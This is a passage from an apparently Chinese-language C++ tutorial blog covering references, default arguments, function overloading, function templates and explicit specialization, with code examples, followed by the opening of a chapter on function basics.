语法: 引用传递的调用语法更简洁自然 (swap_ref(a, b))，而指针传递需要显式获取地址 (swap_ptr(&amp;a, &amp;b)) 并在函数内部解引用 (*p_a)。 空值: 指针可以为 nullptr，需要在使用前检查。引用通常（在标准用法下）不会是“空”的，因为它必须引用一个已存在的对象。这使得引用在某些情况下更安全。 目的: 两者都可以用来允许函数修改调用者的变量，以及避免大型对象的复制开销。 8.2.3 引用的属性和特别之处 必须初始化: 如前所述，引用在声明时必须绑定到一个已存在的对象。 不可重新绑定: 引用不能在初始化后更改其引用的对象。 行为像原变量: 对引用的操作（赋值、取地址等）通常表现得就像直接对原始变量操作一样。 临时变量和 const 引用: 通常，不能将引用绑定到临时变量或字面值。但有一个重要的例外：常量引用 (const type&amp;) 可以绑定到临时变量、字面值或类型稍有不同的变量（如果可以进行隐式转换）。 12345678double value = 3.14;// int&amp; ref_val = value; // 错误：类型不匹配const int&amp; const_ref_val = value; // 合法！创建了一个临时的 int(3)，const_ref_val 引用这个临时变量const double&amp; ref_literal = 5.0 * 2.0; // 合法！引用一个临时 double(10.0)long num = 100L;const int&amp; ref_num = num; // 合法！引用一个临时的 int(100) 这种特性使得常量引用在函数参数中非常有用，因为它们可以接受更广泛的实参类型（包括字面值和需要类型转换的值），同时保证函数不会修改它们。 8.2.4 将引用用于结构按引用传递对于结构体特别有用，因为它可以避免复制整个结构体（可能包含许多成员）的开销。如果函数不需要修改结构体，应使用常量引用 (const struct_type&amp;)。 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;string&gt;struct Product &#123; std::string name; double price; int quantity;&#125;;// 按常量引用传递结构，避免复制且不修改void display_product(const Product&amp; prod) &#123; std::cout &lt;&lt; &quot;Product Name: &quot; &lt;&lt; prod.name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Price: $&quot; &lt;&lt; prod.price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Quantity: &quot; &lt;&lt; prod.quantity &lt;&lt; std::endl; // prod.price = 0.0; // 错误！不能通过 const 引用修改&#125;// 按引用传递结构，允许修改void apply_discount(Product&amp; prod, double discount_percentage) &#123; if (discount_percentage &gt; 0 &amp;&amp; discount_percentage &lt; 100) &#123; prod.price *= (1.0 - discount_percentage / 100.0); &#125;&#125;int main() &#123; Product laptop = &#123;&quot;Laptop Pro&quot;, 1200.0, 10&#125;; std::cout &lt;&lt; &quot;--- Initial Product ---&quot; &lt;&lt; std::endl; display_product(laptop); // 高效传递，不复制 apply_discount(laptop, 10.0); // 传递引用以修改价格 std::cout &lt;&lt; &quot;\\n--- Product After 10% Discount ---&quot; &lt;&lt; std::endl; display_product(laptop); // 再次高效传递 return 0;&#125; 8.2.5 将引用用于类对象将引用用于类对象与用于结构体完全相同。按常量引用 (const class_type&amp;) 传递是避免复制大型对象并确保函数不修改对象状态的标准做法。如果需要修改对象，则使用普通引用 (class_type&amp;)。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;class Student &#123;public: Student(const std::string&amp; n) : name(n) &#123;&#125; void add_grade(int g) &#123; grades.push_back(g); &#125; void print_info() const &#123; // const 成员函数 std::cout &lt;&lt; &quot;Student: &quot; &lt;&lt; name &lt;&lt; &quot;, Grades: &quot;; for (int g : grades) &#123; std::cout &lt;&lt; g &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; &#125; const std::string&amp; get_name() const &#123; return name; &#125; // 返回常量引用private: std::string name; std::vector&lt;int&gt; grades;&#125;;// 按常量引用传递类对象void show_student_summary(const Student&amp; s) &#123; std::cout &lt;&lt; &quot;Summary for &quot; &lt;&lt; s.get_name() &lt;&lt; std::endl; s.print_info(); // 可以调用 const 成员函数 // s.add_grade(100); // 错误！不能通过 const 引用调用非 const 成员函数&#125;int main() &#123; Student alice(&quot;Alice&quot;); alice.add_grade(95); alice.add_grade(88); show_student_summary(alice); // 高效传递，不复制 return 0;&#125; 8.2.6 对象、继承和引用当与类继承结合使用时，基类的引用可以指向派生类的对象。这是实现多态 (Polymorphism) 的关键机制之一（与指针类似）。通过基类引用调用虚函数时，会执行派生类中相应的版本。这部分内容将在后续章节（如第 13 章）详细介绍。 12345678910111213141516171819202122232425// 概念预览 (将在后续章节详细讲解)class Base &#123;public: virtual void show() const &#123; std::cout &lt;&lt; &quot;Base::show()&quot; &lt;&lt; std::endl; &#125; virtual ~Base() &#123;&#125; // 虚析构函数&#125;;class Derived : public Base &#123;public: void show() const override &#123; std::cout &lt;&lt; &quot;Derived::show()&quot; &lt;&lt; std::endl; &#125;&#125;;void display(const Base&amp; obj) &#123; // 参数是基类的常量引用 obj.show(); // 调用虚函数，会根据 obj 实际引用的对象类型执行相应版本&#125;int main() &#123; Base b; Derived d; display(b); // 输出: Base::show() display(d); // 输出: Derived::show() (多态行为) return 0;&#125; 8.2.7 何时使用引用参数选择使用值传递、指针传递还是引用传递取决于具体需求： 按值传递 (type param): 适用于小型数据类型（int, double, bool, 指针本身）。 当函数需要操作数据的副本而不影响原始数据时。 简单易懂。 按指针传递 (type* param): 当函数需要修改调用者的原始数据时（传统 C 风格）。 当需要表示“可选”参数（可以传递 nullptr）时。 与 C 库或旧代码交互时。 传递大型对象以避免复制开销（但通常引用更受欢迎）。 按引用传递 (type&amp; param): 当函数需要修改调用者的原始数据时（C++ 风格，通常比指针更简洁安全）。 传递大型对象（结构、类）以避免复制开销，但函数不需要修改对象时，应使用**常量引用 (const type&amp; param)**。这是 C++ 中非常常见的做法，兼具效率和安全性。 经验法则: 对于内置类型和小型结构，优先考虑按值传递。 对于需要修改调用者数据的大型对象或函数，使用按引用传递 (type&amp;)。 对于不需要修改调用者数据的大型对象，使用按常量引用传递 (const type&amp;) 以提高效率和安全性。 在需要表示可选参数或与 C 风格代码交互时，考虑使用按指针传递 (type*)。 引用是 C++ 中一个强大且常用的特性，尤其是在函数参数和返回值中，它提供了指针之外的另一种处理间接访问和避免复制的方式。 8.3 默认参数C++ 允许在函数声明（原型）或定义中为函数的参数指定默认值。如果在调用函数时没有为带有默认值的参数提供实参，那么编译器会自动使用该参数的默认值。如果提供了实参，则使用提供的实参值，覆盖默认值。 目的: 提高函数的灵活性，允许用户在调用时省略某些不常用的参数。 简化函数调用，特别是当某些参数在大多数情况下都使用相同的值时。 用法在函数原型或定义中，通过在参数声明后使用赋值运算符 = 来指定默认值。 语法 (在原型中指定): 1return_type function_name(type param1, type param2 = default_value2, type param3 = default_value3); 重要规则: 从右到左规则: 必须为函数参数列表从右到左依次提供默认值。如果某个参数有默认值，则其右侧的所有参数必须也有默认值。 123456// 合法void func1(int a, int b = 10, int c = 20);// 合法void func2(int a = 5, int b = 10, int c = 20);// 非法！如果 b 有默认值，c 必须也有// void func_error(int a, int b = 10, int c); 原型 vs. 定义: 默认参数值通常在函数原型（声明）中指定，而不是在函数定义中。如果在原型中指定了默认值，则定义中不能再次指定。如果函数没有单独的原型（定义在调用之前），则可以在定义中指定默认值。将默认值放在原型中（通常在头文件里）是更好的做法，因为它向调用者清晰地展示了可以省略哪些参数。 调用时的匹配: 调用函数时，提供的实参会从左到右匹配参数。不能跳过没有默认值的参数去为有默认值的参数提供值。 1234func1(1); // 等效于 func1(1, 10, 20)func1(1, 50); // 等效于 func1(1, 50, 20)func1(1, 50, 30); // 等效于 func1(1, 50, 30)// func1(1, , 30); // 非法！不能跳过参数 b 示例1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;// 函数原型，指定默认参数// level 默认为 1， prefix 默认为 &quot;Log: &quot;void log_message(const std::string&amp; message, int level = 1, const std::string&amp; prefix = &quot;Log: &quot;);int main() &#123; // 调用方式 1: 提供所有参数 log_message(&quot;System started.&quot;, 0, &quot;Info: &quot;); // 调用方式 2: 省略最右边的 prefix 参数，使用其默认值 log_message(&quot;Processing data...&quot;, 2); // prefix 使用 &quot;Log: &quot; // 调用方式 3: 省略 level 和 prefix 参数，使用它们的默认值 log_message(&quot;Operation complete.&quot;); // level 使用 1, prefix 使用 &quot;Log: &quot; // log_message(&quot;Error occurred&quot;, , &quot;Error: &quot;); // 非法！不能跳过 level return 0;&#125;// 函数定义 (注意：这里不再重复默认值)void log_message(const std::string&amp; message, int level, const std::string&amp; prefix) &#123; std::cout &lt;&lt; prefix &lt;&lt; &quot;[Level &quot; &lt;&lt; level &lt;&lt; &quot;] &quot; &lt;&lt; message &lt;&lt; std::endl;&#125; 输出: 123Info: [Level 0] System started.Log: [Level 2] Processing data...Log: [Level 1] Operation complete. 代码解释: log_message 函数的原型为 level 和 prefix 参数指定了默认值。 main 函数展示了不同的调用方式： 第一次调用提供了所有三个参数。 第二次调用只提供了 message 和 level，prefix 使用了默认值 &quot;Log: &quot;。 第三次调用只提供了 message，level 使用了默认值 1，prefix 使用了默认值 &quot;Log: &quot;。 函数定义部分没有重复默认值，只列出了参数类型和名称。 默认参数是 C++ 中一个方便的特性，可以使函数接口更加灵活和易用，尤其是在处理具有多个配置选项或不常用参数的函数时。 8.4 函数重载函数重载 (Function Overloading) 是 C++ 的一项特性，允许在同一个作用域内定义多个同名函数，只要它们的参数列表（也称为函数签名）不同即可。参数列表的不同可以体现在参数的数量、类型或顺序上。编译器会根据函数调用时提供的实参类型和数量来决定具体调用哪个重载版本。 函数签名: 函数的名称和其参数列表（参数的类型、数量和顺序）共同构成了函数签名。注意：函数的返回类型不属于函数签名的一部分，不能仅凭返回类型不同来重载函数。 目的: 允许使用相同的函数名来执行概念上相似但操作于不同数据类型或参数组合的任务。 提高代码的可读性和易用性，用户不必为相似操作记住多个不同的函数名。 8.4.1 重载示例假设我们需要一个函数来打印不同类型的数据。使用函数重载，我们可以定义多个名为 print 的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include &lt;string&gt;// 重载版本 1: 打印 intvoid print(int i) &#123; std::cout &lt;&lt; &quot;Printing int: &quot; &lt;&lt; i &lt;&lt; std::endl;&#125;// 重载版本 2: 打印 doublevoid print(double d) &#123; std::cout &lt;&lt; &quot;Printing double: &quot; &lt;&lt; d &lt;&lt; std::endl;&#125;// 重载版本 3: 打印字符串 (const char*)void print(const char* s) &#123; std::cout &lt;&lt; &quot;Printing C-string: &quot; &lt;&lt; s &lt;&lt; std::endl;&#125;// 重载版本 4: 打印 std::string (常量引用)void print(const std::string&amp; s) &#123; std::cout &lt;&lt; &quot;Printing std::string: &quot; &lt;&lt; s &lt;&lt; std::endl;&#125;// 重载版本 5: 打印两个 intvoid print(int i, int j) &#123; std::cout &lt;&lt; &quot;Printing two ints: &quot; &lt;&lt; i &lt;&lt; &quot; and &quot; &lt;&lt; j &lt;&lt; std::endl;&#125;// 错误示例：仅返回类型不同，无法重载// int print(int i) &#123;// std::cout &lt;&lt; &quot;Trying to return int: &quot; &lt;&lt; i &lt;&lt; std::endl;// return i;// &#125;int main() &#123; print(10); // 调用版本 1 (int) print(3.14); // 调用版本 2 (double) print(&quot;Hello&quot;); // 调用版本 3 (const char*) std::string msg = &quot;World&quot;; print(msg); // 调用版本 4 (const std::string&amp;) print(5, 20); // 调用版本 5 (int, int) // print(10L); // 可能产生歧义调用，因为 long 可以转换为 int 或 double // 编译器可能报错或选择一个最佳匹配 return 0;&#125; 代码解释: 我们定义了五个名为 print 的函数，但它们的参数列表各不相同（类型或数量不同）。 在 main 函数中，编译器根据传递给 print 的实参类型和数量，自动选择了正确的重载版本进行调用。 名称修饰 (Name Mangling): C++ 编译器内部通过一种称为名称修饰或名称改编（Name Mangling）的技术来区分同名的重载函数。它会根据函数的签名（包括参数类型）生成一个内部唯一的名称。例如，print(int) 和 print(double) 在编译后会变成不同的内部名称，这样链接器就能正确地将函数调用链接到对应的函数定义。 8.4.2 何时使用函数重载函数重载是一个强大的工具，但应谨慎使用，以保持代码的清晰性。以下是一些适合使用函数重载的情况： 执行概念上相似的任务: 当多个函数执行的操作逻辑上相似，只是处理的数据类型不同时（如上例中的 print 函数，或计算不同类型数值绝对值的 abs 函数）。 提供不同参数组合: 当一个任务可以通过提供不同数量或类型的参数来完成时（例如，一个构造函数可以接受不同的初始化参数组合）。 避免使用函数重载的情况: 执行完全不同的任务: 如果函数虽然名称相同，但执行的任务在逻辑上毫不相关，那么重载可能会导致混淆。此时应使用不同的函数名。 仅参数类型可通过默认参数或模板实现: 如果函数的功能差异可以通过默认参数或函数模板（见 8.5 节）更清晰地表达，那么可能不需要重载。例如，如果只是参数数量不同，且较少参数的版本可以通过为较多参数版本提供默认值来实现，那么默认参数可能更合适。 总结: 函数重载允许我们用同一个名称定义多个功能相似但参数列表不同的函数。编译器根据调用时提供的实参来选择正确的版本。这是 C++ 实现多态性的一种方式（编译时多态），可以使代码更直观、更易用，但应确保重载的函数在逻辑上是相关的，以避免混淆。 8.5 函数模板函数重载允许我们为不同的参数类型定义同名函数，但如果这些函数的逻辑完全相同，只是处理的数据类型不同，为每种类型都写一个重载版本会很繁琐且容易出错。例如，交换两个 int 和交换两个 double 的逻辑是一样的。 函数模板 (Function Template) 提供了一种更通用的解决方案。它允许我们编写一个与类型无关的函数定义，其中的数据类型使用模板参数（也叫类型参数）来表示。编译器会根据函数调用时使用的具体数据类型，自动生成（实例化）相应的函数版本。 目的: 编写通用的、可重用的代码，适用于多种数据类型。 减少代码重复。 提高代码的可维护性。 语法: 1234template &lt;typename T&gt; // 或者 template &lt;class T&gt;return_type function_name(parameter_list) &#123; // 函数体，可以使用类型参数 T&#125; template &lt;typename T&gt;: 这是模板声明，告诉编译器接下来是一个模板定义。typename 是关键字（也可以用 class 关键字代替，两者在这里等价），T 是模板参数的名称（通常用大写字母，如 T, U, V，但可以是任何合法标识符）。你可以定义多个模板参数，用逗号分隔，例如 template &lt;typename T, typename U&gt;。 return_type, parameter_list, function_name: 与普通函数定义类似，但可以在这些部分使用模板参数 T 来代表某种待定的数据类型。 示例：通用的交换函数模板 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;// 定义一个函数模板 Swaptemplate &lt;typename T&gt; // T 代表任意类型void Swap(T&amp; a, T&amp; b) &#123; // 参数是类型 T 的引用 T temp; // 声明一个类型为 T 的临时变量 temp = a; a = b; b = temp;&#125;int main() &#123; int i = 10, j = 20; std::cout &lt;&lt; &quot;Original ints: i = &quot; &lt;&lt; i &lt;&lt; &quot;, j = &quot; &lt;&lt; j &lt;&lt; std::endl; Swap(i, j); // 编译器自动生成 Swap&lt;int&gt;(int&amp;, int&amp;) 版本 std::cout &lt;&lt; &quot;Swapped ints: i = &quot; &lt;&lt; i &lt;&lt; &quot;, j = &quot; &lt;&lt; j &lt;&lt; std::endl; double x = 1.5, y = 2.8; std::cout &lt;&lt; &quot;\\nOriginal doubles: x = &quot; &lt;&lt; x &lt;&lt; &quot;, y = &quot; &lt;&lt; y &lt;&lt; std::endl; Swap(x, y); // 编译器自动生成 Swap&lt;double&gt;(double&amp;, double&amp;) 版本 std::cout &lt;&lt; &quot;Swapped doubles: x = &quot; &lt;&lt; x &lt;&lt; &quot;, y = &quot; &lt;&lt; y &lt;&lt; std::endl; char c1 = &#x27;A&#x27;, c2 = &#x27;B&#x27;; std::cout &lt;&lt; &quot;\\nOriginal chars: c1 = &quot; &lt;&lt; c1 &lt;&lt; &quot;, c2 = &quot; &lt;&lt; c2 &lt;&lt; std::endl; Swap(c1, c2); // 编译器自动生成 Swap&lt;char&gt;(char&amp;, char&amp;) 版本 std::cout &lt;&lt; &quot;Swapped chars: c1 = &quot; &lt;&lt; c1 &lt;&lt; &quot;, c2 = &quot; &lt;&lt; c2 &lt;&lt; std::endl; // Swap(i, x); // 错误！编译器无法推断出唯一的 T 类型 (int vs double) return 0;&#125; 代码解释: 我们定义了一个名为 Swap 的函数模板，它使用类型参数 T。 在 main 函数中，当我们调用 Swap(i, j) 时，编译器看到两个实参都是 int 类型，于是它推断出 T 应该是 int，并自动生成（实例化）一个专门处理 int 的 Swap 函数版本：void Swap&lt;int&gt;(int&amp; a, int&amp; b)。 类似地，调用 Swap(x, y) 时，编译器生成 Swap&lt;double&gt; 版本；调用 Swap(c1, c2) 时，生成 Swap&lt;char&gt; 版本。 这个过程称为**模板实例化 (Template Instantiation)**。编译器只为程序中实际用到的类型生成函数实例。 8.5.1 重载的模板函数模板也可以像普通函数一样被重载。你可以提供多个同名的函数模板，只要它们的模板参数列表不同，或者函数参数列表（非模板参数部分）不同即可。 示例：重载模板以处理不同数量的参数或特定类型 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;// 模板版本 1: 交换两个同类型变量template &lt;typename T&gt;void Swap(T&amp; a, T&amp; b) &#123; std::cout &lt;&lt; &quot;Using Swap(T&amp;, T&amp;)&quot; &lt;&lt; std::endl; T temp = a; a = b; b = temp;&#125;// 模板版本 2: 交换两个数组的元素 (需要额外参数指定大小)template &lt;typename T&gt;void Swap(T arr1[], T arr2[], int n) &#123; std::cout &lt;&lt; &quot;Using Swap(T[], T[], int)&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; n; ++i) &#123; T temp = arr1[i]; arr1[i] = arr2[i]; arr2[i] = temp; &#125;&#125;int main() &#123; int i = 10, j = 20; Swap(i, j); // 调用版本 1: Swap&lt;int&gt;(int&amp;, int&amp;) int arr_a[] = &#123;1, 2, 3&#125;; int arr_b[] = &#123;4, 5, 6&#125;; int size = 3; std::cout &lt;&lt; &quot;\\nBefore swapping arrays:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_a: &quot; &lt;&lt; arr_a[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[2] &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_b: &quot; &lt;&lt; arr_b[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[2] &lt;&lt; std::endl; Swap(arr_a, arr_b, size); // 调用版本 2: Swap&lt;int&gt;(int[], int[], int) std::cout &lt;&lt; &quot;\\nAfter swapping arrays:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_a: &quot; &lt;&lt; arr_a[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[2] &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_b: &quot; &lt;&lt; arr_b[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[2] &lt;&lt; std::endl; return 0;&#125; 编译器会根据调用时提供的参数数量和类型（包括是否是数组）来选择最匹配的重载模板。 8.5.2 模板的局限性函数模板是通用的，但并非万能。模板代码中使用的操作（如赋值 =、比较 &lt;、&gt; 等）必须对实例化时使用的具体类型有效。如果某个类型不支持模板代码中的操作，那么实例化该类型的模板就会导致编译错误。 示例：模板可能失败的情况 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;template &lt;typename T&gt;void CompareAndPrint(const T&amp; a, const T&amp; b) &#123; if (a &lt; b) &#123; // 假设类型 T 支持 &lt; 运算符 std::cout &lt;&lt; &quot;a is less than b&quot; &lt;&lt; std::endl; &#125; else if (b &lt; a) &#123; // 假设类型 T 支持 &lt; 运算符 std::cout &lt;&lt; &quot;b is less than a&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;a and b are equal (or incomparable)&quot; &lt;&lt; std::endl; &#125;&#125;struct Data &#123; int val; // 这个结构体没有重载 &lt; 运算符&#125;;int main() &#123; int x = 5, y = 10; CompareAndPrint(x, y); // OK: int 支持 &lt; 运算符 Data d1 = &#123;10&#125;; Data d2 = &#123;20&#125;; // CompareAndPrint(d1, d2); // 编译错误！Data 类型没有定义 operator&lt; // 编译器无法实例化 CompareAndPrint&lt;Data&gt; return 0;&#125; 要解决这个问题，可以为 Data 结构重载 &lt; 运算符，或者使用下一节将介绍的显式具体化。 8.5.3 显式具体化 (Explicit Specialization)有时，通用的函数模板对于某个特定类型可能不适用或效率不高，我们希望为这个特定类型提供一个专门的、非模板的实现。这就是显式具体化。 语法: 1234template &lt;&gt; // 空的尖括号表示这是一个具体化return_type function_name&lt;specific_type&gt;(parameter_list_with_specific_type) &#123; // 针对 specific_type 的特殊实现&#125; template &lt;&gt;: 告诉编译器这是一个显式具体化。 function_name&lt;specific_type&gt;: 在函数名后明确指定要为哪个类型提供具体化版本。 函数体包含针对 specific_type 的特殊代码。 示例：为结构体具体化 Swap 模板 假设我们有一个结构体，我们只想交换其中的某个成员，而不是整个结构体。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;struct Job &#123; char name[40]; double salary; int floor;&#125;;// 通用 Swap 模板 (同上)template &lt;typename T&gt;void Swap(T&amp; a, T&amp; b) &#123; std::cout &lt;&lt; &quot;(Using generic Swap)&quot; &lt;&lt; std::endl; T temp = a; a = b; b = temp;&#125;// 针对 Job 类型的显式具体化template &lt;&gt;void Swap&lt;Job&gt;(Job&amp; j1, Job&amp; j2) &#123; // 明确指定 T 为 Job std::cout &lt;&lt; &quot;(Using specialized Swap for Job - swapping salary and floor only)&quot; &lt;&lt; std::endl; // 只交换 salary 和 floor 成员 double temp_salary = j1.salary; j1.salary = j2.salary; j2.salary = temp_salary; int temp_floor = j1.floor; j1.floor = j2.floor; j2.floor = temp_floor; // name 成员保持不变&#125;int main() &#123; int i = 10, j = 20; Swap(i, j); // 调用通用模板 Swap&lt;int&gt; Job sue = &#123;&quot;Susan Yaffee&quot;, 73000.60, 7&#125;; Job sid = &#123;&quot;Sidney Taffee&quot;, 78060.72, 9&#125;; std::cout &lt;&lt; &quot;\\nOriginal Jobs:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; sue.name &lt;&lt; &quot;: $&quot; &lt;&lt; sue.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sue.floor &lt;&lt; std::endl; std::cout &lt;&lt; sid.name &lt;&lt; &quot;: $&quot; &lt;&lt; sid.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sid.floor &lt;&lt; std::endl; Swap(sue, sid); // 调用显式具体化版本 Swap&lt;Job&gt; std::cout &lt;&lt; &quot;\\nSwapped Jobs (partially):&quot; &lt;&lt; std::endl; std::cout &lt;&lt; sue.name &lt;&lt; &quot;: $&quot; &lt;&lt; sue.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sue.floor &lt;&lt; std::endl; std::cout &lt;&lt; sid.name &lt;&lt; &quot;: $&quot; &lt;&lt; sid.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sid.floor &lt;&lt; std::endl; return 0;&#125; 当编译器遇到 Swap(sue, sid) 调用时，它发现存在一个专门为 Job 类型定义的显式具体化版本 Swap&lt;Job&gt;，于是优先选择并调用这个特殊版本，而不是通用的模板版本。 8.5.4 实例化和具体化 (Instantiation and Specialization)区分这两个概念很重要： 实例化 (Instantiation): 编译器根据函数模板和调用时使用的具体类型自动生成一个特定类型的函数版本。这是模板的基本工作方式。 隐式实例化 (Implicit Instantiation): 编译器在需要时自动进行（如 Swap(i, j)）。 显式实例化 (Explicit Instantiation): 程序员可以指示编译器立即生成特定类型的函数版本，即使还没有调用它。语法：template return_type function_name&lt;specific_type&gt;(parameter_list); (注意末尾的分号)。这在某些高级场景（如将模板定义放在源文件中）可能有用。 12// 在 .cpp 文件中显式实例化 Swap&lt;int&gt;template void Swap&lt;int&gt;(int&amp;, int&amp;); 具体化 (Specialization): 程序员为某个特定类型提供一个完全不同的、非模板的函数定义，以覆盖通用的模板行为。 显式具体化 (Explicit Specialization): 使用 template &lt;&gt; 语法为特定类型提供自定义实现（如上例中的 Swap&lt;Job&gt;）。 8.5.5 编译器选择使用哪个函数版本当存在多个函数（普通函数、函数模板、模板具体化）可能匹配一个函数调用时，编译器遵循一套规则来选择最佳匹配，这个过程称为**重载解析 (Overload Resolution)**。简化规则如下： 寻找完全匹配: 编译器首先查找是否存在一个非模板函数，其参数类型与调用实参完全匹配（或只需进行不重要的转换，如数组名到指针）。 寻找模板匹配: 如果没有找到完全匹配的非模板函数，编译器会尝试查找函数模板。 查找显式具体化: 检查是否存在一个显式具体化版本，其类型与实参完全匹配。 尝试模板实例化: 尝试通过实参推导模板参数，看是否能从通用模板生成一个匹配的实例。 选择最佳匹配: 如果只有一个匹配项（非模板函数、显式具体化或模板实例），则选择该项。 如果存在多个匹配项： 非模板函数优先于模板实例: 如果一个非模板函数和一个模板实例都能匹配，通常优先选择非模板函数。 显式具体化优先于模板实例: 如果一个显式具体化和一个通用模板实例都能匹配，优先选择显式具体化。 更具体的模板优先: 如果有多个模板实例可以匹配（可能涉及类型转换），编译器会尝试找出“最具体”的模板（即需要较少或较不复杂的类型转换就能匹配的模板）。如果无法确定哪个最具体，则调用是**歧义的 (ambiguous)**，会导致编译错误。 示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;// 1. 非模板函数void Show(int i) &#123; std::cout &lt;&lt; &quot;Non-template Show(int): &quot; &lt;&lt; i &lt;&lt; std::endl; &#125;// 2. 通用函数模板template &lt;typename T&gt;void Show(T t) &#123; std::cout &lt;&lt; &quot;Template Show(T): &quot; &lt;&lt; t &lt;&lt; std::endl; &#125;// 3. 显式具体化template &lt;&gt;void Show&lt;double&gt;(double d) &#123; std::cout &lt;&lt; &quot;Specialized Show&lt;double&gt;: &quot; &lt;&lt; d &lt;&lt; std::endl; &#125;int main() &#123; int a = 10; double b = 3.14; char c = &#x27;X&#x27;; Show(a); // 优先匹配 1 (非模板函数) Show(b); // 优先匹配 3 (显式具体化) Show(c); // 匹配 2 (通用模板实例化 Show&lt;char&gt;) Show&lt;&gt;(a); // 使用 &lt;&gt; 强制编译器只考虑模板版本，匹配 2 (通用模板实例化 Show&lt;int&gt;) return 0;&#125; 8.5.6 模板函数的发展函数模板是 C++ 泛型编程的基础。自 C++11 以来，模板功能得到了进一步增强： auto 返回类型推导: 允许编译器根据 return 语句推导函数模板的返回类型。 可变参数模板 (Variadic Templates): 允许定义接受任意数量、任意类型参数的模板（见 18.6 节）。 别名模板 (using): 可以为模板创建别名。 Lambda 表达式: 可以创建匿名的函数对象，常与模板算法结合使用。 Concepts (C++20): 允许对模板参数施加更明确的约束，提高了编译时错误信息的可读性，并使模板意图更清晰。 函数模板是 C++ 中一个非常强大和灵活的特性，它使得编写高度通用和可重用的代码成为可能。 8.6 总结本章深入探讨了 C++ 函数的更多高级特性，旨在提高代码的效率、灵活性和可重用性。 主要内容回顾： 内联函数 (inline): 一种优化建议，请求编译器将函数代码直接替换到调用点，以减少小型、频繁调用函数的调用开销。 inline 只是建议，编译器可自行决定是否采纳。 通常将内联函数定义放在头文件中。 相比宏，内联函数具有类型安全、行为可预测等优点。 引用变量 (&amp;): 变量的别名，声明时必须初始化，之后不能再引用其他变量。 按引用传递 (type&amp;)：函数参数成为原始实参的别名，允许函数修改原始数据，且避免了大型对象的复制开销。 按常量引用传递 (const type&amp;)：函数参数成为原始实参的常量别名，不能通过引用修改原始数据，但同样避免了复制开销。这是传递大型对象进行只读访问的推荐方式。 引用比指针在语法上更简洁，且通常不涉及空值问题。 默认参数: 允许在函数声明（原型）中为参数指定默认值。 调用函数时，如果省略了带有默认值的参数，则使用默认值。 默认参数必须从参数列表的最右边开始指定。 简化了函数调用，提高了函数的灵活性。 函数重载: 允许在同一作用域内定义多个同名函数，只要它们的参数列表（数量、类型、顺序）不同。 编译器根据调用时的实参来选择匹配的重载版本。 返回类型不能作为区分重载函数的依据。 适用于执行概念上相似但处理不同参数的任务。 函数模板 (template &lt;typename T&gt;): 创建通用的、与类型无关的函数定义。 编译器根据调用时使用的具体类型实例化相应的函数版本。 重载模板: 可以定义多个同名模板，只要它们的参数列表或模板参数列表不同。 显式具体化 (template &lt;&gt;): 为特定类型提供专门的、非模板的实现，以覆盖通用模板的行为。 模板是 C++ 泛型编程的基础，极大地提高了代码的可重用性。 通过掌握这些高级函数特性，可以编写出更高效、更灵活、更易于维护的 C++ 代码。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 7 函数——C++的编程模块","slug":"Cpp_tutorial_Chapter_7","date":"2025-04-26T12:03:35.384Z","updated":"2025-04-26T12:01:58.783Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_7/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_7/","excerpt":"","text":"7.1 复习函数的基本知识函数是 C++ 程序的基本构建块，它们允许我们将代码组织成可重用的、逻辑独立的单元。使用函数可以使程序更模块化、更易于理解和维护。本节将复习函数的基本概念：定义、原型和调用。 7.1.1 定义函数函数定义 (Function Definition) 包含了函数的实际代码，它说明了函数做什么以及如何做。一个函数定义包括以下几个部分： 返回类型 (Return Type): 函数执行完毕后返回给调用者的值的类型。如果函数不返回任何值，则返回类型为 void。 函数名 (Function Name): 用于调用函数的标识符。命名规则与变量名相同。 参数列表 (Parameter List): 位于函数名后的圆括号 () 中，用于接收传递给函数的值。参数之间用逗号分隔，每个参数都需要指定类型和名称。如果函数不接受任何参数，括号内可以为空或写 void。 函数体 (Function Body): 位于花括号 &#123;&#125; 中，包含实现函数功能的 C++ 语句。 语法: 12345return_type function_name(parameter_list) &#123; // 函数体：包含执行任务的语句 // 如果 return_type 不是 void，则需要 return 语句返回值 return value; // (如果 return_type 不是 void)&#125; 示例：定义一个简单的函数 这个函数不接受参数，也不返回值 (void)，只是打印一条消息。 123456789101112#include &lt;iostream&gt;// 函数定义void print_greeting() &#123; std::cout &lt;&lt; &quot;Hello from the function!&quot; &lt;&lt; std::endl;&#125;int main() &#123; 